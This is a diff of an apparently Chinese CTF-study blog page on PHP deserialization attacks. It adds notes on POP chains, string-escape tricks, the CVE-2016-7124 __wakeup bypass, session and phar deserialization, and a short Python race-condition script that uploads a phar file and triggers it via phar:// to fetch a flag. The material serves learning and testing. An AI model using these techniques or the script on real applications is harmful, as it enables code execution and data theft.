@@ -403,21 +403,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-16
+                    2023-04-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    7 分
                 </div>
                 
 
@@ -565,7 +565,39 @@ object(test)#1 (3) &#123;
 功能: 被var_dump()函数输出一个数组，包含对象的调试信息
 参数: 没有参数
 </code></pre>
-<h4 id="POP链前置知识"><a href="#POP链前置知识" class="headerlink" title="POP链前置知识"></a>POP链前置知识</h4><p><strong>POP是什么？</strong><br>在反序列化中，我们能控制的数据就是对象中的属性值<br>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的种payload<br><strong>POC是什么？</strong><br>POC (Proof of concept)又称概念验证，可以理解成漏洞验证程序<br>POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码<br><strong>如何分析POP链？</strong><br>最好使用反推法！<br>1.找到可利用的函数<br>2.根据参数的传递与调用反推出哪个变量需要是什么<br>3.分析判断有哪些魔术方法可以被利用以及如何被调用<br><strong>如何利用漏洞？</strong><br><img src="https://s2.loli.net/2023/04/16/wSFIaq7h4Ol32tg.png" alt="POP链构造例子.png"><br><strong>构造如下:</strong><br><img src="https://s2.loli.net/2023/04/16/iSj1gtLHqTQaNsx.png" alt="POP链构造例子解析.png"></p>
+<h4 id="POP链前置知识"><a href="#POP链前置知识" class="headerlink" title="POP链前置知识"></a>POP链前置知识</h4><p><strong>POP是什么？</strong><br>在反序列化中，我们能控制的数据就是对象中的属性值<br>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的种payload<br><strong>POC是什么？</strong><br>POC (Proof of concept)又称概念验证，可以理解成漏洞验证程序<br>POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码<br><strong>如何分析POP链？</strong><br>最好使用反推法！<br>1.找到可利用的函数<br>2.根据参数的传递与调用反推出哪个变量需要是什么<br>3.分析判断有哪些魔术方法可以被利用以及如何被调用<br><strong>如何利用漏洞？</strong><br><img src="https://s2.loli.net/2023/04/16/wSFIaq7h4Ol32tg.png" alt="POP链构造例子"><br><strong>构造如下:</strong><br><img src="https://s2.loli.net/2023/04/16/iSj1gtLHqTQaNsx.png" alt="POP链构造例子解析"></p>
+<h4 id="字符串逃逸——增多"><a href="#字符串逃逸——增多" class="headerlink" title="字符串逃逸——增多"></a>字符串逃逸——增多</h4><p>字符串以<code>;&#125;</code>结束，后面的不看<br>空（N）不算在内</p>
+<p><img src="https://s2.loli.net/2023/04/17/qd4L8MtOH2bPKQk.png" alt="字符串增多例题01"><br><img src="https://s2.loli.net/2023/04/17/jS5ActwNfYMXhbx.png" alt="字符串增多例题02"></p>
+<h4 id="字符串逃逸——减少"><a href="#字符串逃逸——减少" class="headerlink" title="字符串逃逸——减少"></a>字符串逃逸——减少</h4><p><img src="https://s2.loli.net/2023/04/18/71zLkKi9cTGwZho.png" alt="字符串减少例题01"><br><img src="https://s2.loli.net/2023/04/18/KbeAu2j7RMiWCkT.png" alt="字符串减少02例题"></p>
+<h4 id="weakup魔术方法绕过"><a href="#weakup魔术方法绕过" class="headerlink" title="weakup魔术方法绕过"></a>weakup魔术方法绕过</h4><p>反序列化漏洞:<br>CVE-2016-7124<br>漏洞产生原因:<br>如果存在wakeup方法则反序列化前先调用wakeup方法<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup()<br>如果同时还有正则表达式匹配可以用+6代替6<br>记得url编码</p>
+<h4 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h4><p><img src="https://s2.loli.net/2023/04/18/SQVydNngi8rAEkm.png" alt="前置知识"><br><img src="https://s2.loli.net/2023/04/18/mXDo6Qh9V4KF58E.png" alt="PHP存储时"><br><img src="https://s2.loli.net/2023/04/18/bKH46heyWJgDrlw.png" alt="PHP_serialize存储时"><br><img src="https://s2.loli.net/2023/04/18/JRzB3V9TbdjMsUP.png" alt="PHP_binary存储时（少见）"><br><img src="https://s2.loli.net/2023/04/18/xcVBeOpRk5vQPG1.png" alt="漏洞成因及其利用"></p>
+<h4 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p><img src="https://s2.loli.net/2023/04/18/uJm29U1KoICiXl3.png" alt="phar反序列化前置知识"><br><img src="https://s2.loli.net/2023/04/18/ujNiJdK79YUWPyS.png" alt="phar文件结构"><br><img src="https://s2.loli.net/2023/04/18/RDSGLEqZCg3szPv.png" alt="漏洞原理"><br><img src="https://s2.loli.net/2023/04/18/ZsUD1jKMyVeimF4.png" alt="漏洞利用条件"><br>注:<br>（1）phar文件只看文件内容，不看后缀名<br>（2）使用时利用伪协议phar://文件名读取该文件</p>
+<h4 id="其它反序列化链"><a href="#其它反序列化链" class="headerlink" title="其它反序列化链"></a>其它反序列化链</h4><p>找到该框架的版本以及其所用的序列化链<br>从网上找到POC直接利用就行</p>
+<h4 id="使用条件竞争执行phar反序列化"><a href="#使用条件竞争执行phar反序列化" class="headerlink" title="使用条件竞争执行phar反序列化"></a>使用条件竞争执行phar反序列化</h4><pre><code>
+import requests
+import threading
+import base64
+url = &#39;&#39;
+f = open(&#39;./phar.phar&#39;, &#39;rb&#39;)
+data = f.read()
+flag = False
+
+def work1():
+    requests.post(url=url+&quot;?fn=a&quot;, data=data)
+
+def work2():
+    global flag
+    r = requests.post(url=url+&quot;?fn=phar://phar.phar/&quot;, data=&quot;&quot;)
+    if &quot;flag&#123;&quot; in r.text and flag is False:
+        print(base64.b64encode(r.text.encode()))
+        flag = True
+
+while flag is False:
+    a = threading.Thread(target=work1)
+    b = threading.Thread(target=work2)
+    a.start()
+    b.start()
+</code></pre>
 
                 
             </div>
@@ -869,7 +901,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">85.4k</span>
+                        class="white-color">86.5k</span>
             
             
             
